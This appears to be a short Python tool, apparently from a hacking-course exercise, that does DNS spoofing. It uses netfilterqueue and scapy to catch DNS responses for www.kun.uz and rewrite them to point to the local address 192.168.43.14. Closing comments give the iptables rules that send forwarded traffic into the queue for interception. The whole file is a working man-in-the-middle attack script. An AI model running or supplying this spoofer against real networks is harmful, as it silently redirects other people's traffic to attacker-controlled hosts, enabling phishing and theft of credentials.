#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    try:
        scapy_packet = scapy.IP(packet.get_payload())

        if scapy_packet.haslayer(scapy.DNS):

            dns_layer = scapy_packet[scapy.DNS]

            if dns_layer.qr == 1 and scapy_packet.haslayer(scapy.DNSRR):

                try:
                    qname = dns_layer.qd.qname
                except (IndexError, AttributeError):
                    packet.accept()
                    return

                if b"www.kun.uz" in qname:
                    print("[+] Spoofing target:", qname)

                    answer = scapy.DNSRR(rrname=qname,rdata="192.168.43.14",ttl=10)

                    dns_layer.an = answer
                    dns_layer.ancount = 1
                    dns_layer.ns = None
                    dns_layer.ar = None

                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum

                    if scapy_packet.haslayer(scapy.UDP):
                        del scapy_packet[scapy.UDP].len
                        del scapy_packet[scapy.UDP].chksum

                    packet.set_payload(bytes(scapy_packet))

    except Exception:
        pass

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)

try:
    print("[+] Waiting for DNS packets...")
    queue.run()
except KeyboardInterrupt:
    print("\n[+] Stopped")


# doc run the following command in terminal to create a rule for iptables:
# sudo iptables -I FORWARD -j NFQUEUE --queue-num 0

# doc run the following command in terminal to flush the iptables rules after you are done:
# sudo iptables --flush


# own pc check program:
# sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
# sudo iptables -I INPUT -j NFQUEUE --queue-num 0
# sudo iptables --flush
